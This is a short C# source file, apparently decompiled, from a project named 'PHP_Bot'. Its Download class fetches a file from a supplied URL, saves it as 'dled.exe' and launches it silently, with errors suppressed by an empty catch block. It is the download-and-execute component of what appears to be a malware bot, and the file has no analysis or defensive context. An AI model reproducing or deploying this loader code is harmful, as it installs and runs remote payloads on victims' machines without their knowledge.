using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Net;

namespace PHP_Bot;

internal class Download
{
	private void CompletedDownload(object sender, AsyncCompletedEventArgs e)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "-o \"" + Config.Location + "\"";
		processStartInfo.FileName = "dled.exe";
		processStartInfo.UseShellExecute = false;
		try
		{
			Process.Start(processStartInfo);
		}
		catch
		{
		}
	}

	public Download(string url)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFileCompleted += CompletedDownload;
		webClient.DownloadFileAsync(new Uri(url), "dled.exe");
	}
}
